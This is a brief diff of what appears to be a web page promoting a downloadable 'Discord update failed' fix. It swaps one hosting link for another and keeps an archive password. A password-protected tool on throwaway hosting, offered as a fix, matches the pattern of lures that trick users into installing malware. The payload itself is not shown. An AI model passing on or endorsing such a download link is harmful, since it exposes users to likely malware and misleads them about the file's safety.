@@ -27,9 +27,9 @@
 
 Important: Download the tool from the link below.
 
-Download: https://software-hub.forumotion.com/t2-discord-update-failed-fix
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
